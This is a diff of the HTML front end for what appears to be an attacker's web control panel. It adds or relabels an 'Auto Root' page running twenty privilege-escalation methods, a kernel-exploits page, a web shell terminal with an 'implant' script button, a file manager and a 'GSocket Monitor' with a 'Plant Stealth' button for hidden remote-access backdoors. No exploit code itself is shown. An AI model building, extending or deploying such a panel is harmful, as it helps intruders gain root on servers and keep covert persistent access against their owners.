@@ -22,6 +22,7 @@
 </div>
 </nav>
 <main>
+<!-- Dashboard -->
 <div id="p-dash" class="page on">
 <div class="topbar"><div class="topbar-title">System <span>Overview</span></div><div class="topbar-host"><span class="dot"></span><span id="th">-</span></div></div>
 <div id="dash-alert"></div>
@@ -33,41 +34,58 @@
 </div>
 <div class="grid grid-2">
 <div class="card"><div class="card-title">📊 Resources</div><div id="live-stats"></div></div>
-<div class="card"><div class="card-title">⚡ Quick</div><div class="qs"><span onclick="nav('root')">🔓 Root</span><span onclick="nav('exp')">🔥 Exploits</span><span onclick="nav('gs')">🔍 GS Monitor</span><span onclick="nav('term')">💻 Shell</span><span onclick="pull()">🔄 Update</span></div></div>
+<div class="card"><div class="card-title">⚡ Quick Actions</div><div class="qs"><span onclick="nav('root')">🔓 Root</span><span onclick="nav('exp')">🔥 Exploits</span><span onclick="nav('gs')">🔍 GS Monitor</span><span onclick="nav('term')">💻 Shell</span><span onclick="pull()">🔄 Update</span></div></div>
 </div>
 </div>
+
+<!-- Auto-Root -->
 <div id="p-root" class="page">
-<div class="topbar"><div class="topbar-title">Auto <span>Root</span></div><button class="btn btn-purple" onclick="runAutoRoot()" id="btn-autoroot">🚀 Start</button></div>
-<div class="alert success" style="display:none" id="root-success"><span class="alert-icon">🎉</span><div class="alert-text"><strong>ROOT!</strong><span id="root-success-msg"></span></div></div>
-<div class="grid grid-2">
-<div class="card"><div class="card-title">Methods (20)</div><div id="method-list" style="max-height:400px;overflow-y:auto"></div></div>
-<div class="card"><div class="card-title">Output</div><div class="term"><div class="term-header"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">autoroot</div></div><div class="term-body" id="root-out" style="max-height:350px"></div></div></div>
+<div class="topbar">
+<div class="topbar-title">Auto <span>Root</span></div>
+<div style="display:flex;gap:8px">
+<button class="btn btn-sm btn-ghost" onclick="initMethodCards()">Reset</button>
+<button class="btn btn-purple" onclick="runAllMethods()" id="btn-autoroot">🚀 Run All</button>
 </div>
+</div>
+<div class="alert success" style="display:none" id="root-success"><span class="alert-icon">🎉</span><div class="alert-text"><strong>ROOT!</strong><span id="root-success-msg"></span></div></div>
+<div class="card"><div class="card-title">LPE Methods (20)</div><div id="method-list"></div></div>
 <div id="root-result"></div>
 </div>
+
+<!-- Exploits -->
 <div id="p-exp" class="page">
 <div class="topbar"><div class="topbar-title">Kernel <span>Exploits</span></div></div>
 <div class="card"><div id="exp-list"></div></div>
 </div>
+
+<!-- Terminal -->
 <div id="p-term" class="page">
-<div class="topbar"><div class="topbar-title">Shell</div></div>
-<div class="card"><div class="qs" style="margin-bottom:12px"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/gscan.sh')">gscan</span><span onclick="rs('lpe_methods/runner.sh')">autoroot</span></div></div>
+<div class="topbar"><div class="topbar-title">Terminal</div></div>
+<div class="card"><div class="qs" style="margin-bottom:12px"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/gscan.sh')">gscan</span><span onclick="rs('scripts/gs_implant.sh')">implant</span></div></div>
 <div class="term" style="height:calc(100vh - 220px)"><div class="term-header"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">bash</div></div><div class="term-body" id="term-out" style="max-height:calc(100vh - 320px)"></div><div class="term-input"><input id="term-cmd" placeholder="$ command" onkeydown="event.key==='Enter'&&termExec()"><button onclick="termExec()">RUN</button></div></div>
 </div>
+
+<!-- Files -->
 <div id="p-files" class="page">
-<div class="topbar"><div class="topbar-title">Files</div></div>
+<div class="topbar"><div class="topbar-title">File Manager</div></div>
 <div class="fm-toolbar"><div class="fm-path" id="fm-path">~</div><button class="btn btn-sm btn-ghost" onclick="fmUp()">⬆</button><button class="btn btn-sm btn-ghost" onclick="fmRefresh()">🔄</button><button class="btn btn-sm btn-ghost" onclick="fmNewFile()">📄</button><button class="btn btn-sm btn-ghost" onclick="fmNewDir()">📁</button></div>
 <div class="fm-grid" id="fm-list"></div>
 </div>
+
+<!-- GSocket Monitor -->
 <div id="p-gs" class="page">
-<div class="topbar"><div class="topbar-title">GSocket <span>Monitor</span></div><div style="display:flex;gap:8px"><button class="btn btn-sm" onclick="gsScan()">🔍 Scan</button><button class="btn btn-sm btn-green" onclick="gsPlant()">🌱 Plant</button><button class="btn btn-sm btn-red" onclick="gsKillAll()">☠ Kill All</button></div></div>
+<div class="topbar"><div class="topbar-title">GSocket <span>Monitor</span></div><div style="display:flex;gap:8px"><button class="btn btn-sm" onclick="gsScan()">🔍 Scan</button><button class="btn btn-sm btn-green" onclick="gsPlant()">🌱 Plant Stealth</button></div></div>
 <div id="gs-alert"></div>
 <div class="card"><div class="card-title">Detected GSockets</div><div id="gs-list"></div></div>
 </div>
+
+<!-- Processes -->
 <div id="p-proc" class="page">
 <div class="topbar"><div class="topbar-title">Processes</div><button class="btn btn-sm" onclick="loadProc()">🔄</button></div>
 <div class="term"><div class="term-header"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">ps aux</div></div><div class="term-body" id="proc-out" style="max-height:calc(100vh - 200px)"></div></div>
 </div>
+
+<!-- Config -->
 <div id="p-cfg" class="page">
 <div class="topbar"><div class="topbar-title">Config</div></div>
 <div class="card"><div class="card-title">System Info</div><div class="preview-box" id="cfg-info">-</div></div>
@@ -75,7 +93,9 @@
 </div>
 </main>
 </div>
-<div class="modal" id="modal-view"><div class="modal-box"><div class="modal-head"><h3 id="modal-view-title">View</h3><button onclick="closeModal('modal-view')">×</button></div><div class="modal-body"><div class="preview-box" id="modal-view-content"></div></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-view')">Close</button><button class="btn" onclick="fmEdit(currentFile)">Edit</button></div></div></div>
+
+<!-- Modals -->
+<div class="modal" id="modal-view"><div class="modal-box"><div class="modal-head"><h3 id="modal-view-title">View</h3><button onclick="closeModal('modal-view')">×</button></div><div class="modal-body"><div class="preview-box" id="modal-view-content"></div></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-view')">Close</button><button class="btn" onclick="fmEdit()">Edit</button></div></div></div>
 <div class="modal" id="modal-edit"><div class="modal-box"><div class="modal-head"><h3 id="modal-edit-title">Edit</h3><button onclick="closeModal('modal-edit')">×</button></div><div class="modal-body"><textarea id="modal-edit-content"></textarea></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-edit')">Cancel</button><button class="btn" onclick="fmSaveEdit()">Save</button></div></div></div>
 <div class="modal" id="modal-new"><div class="modal-box"><div class="modal-head"><h3>New File</h3><button onclick="closeModal('modal-new')">×</button></div><div class="modal-body"><input type="text" id="modal-new-name" placeholder="filename" style="margin-bottom:12px"><textarea id="modal-new-content" placeholder="Content..."></textarea></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-new')">Cancel</button><button class="btn" onclick="fmSaveNew()">Create</button></div></div></div>
 <script src="app.js"></script>
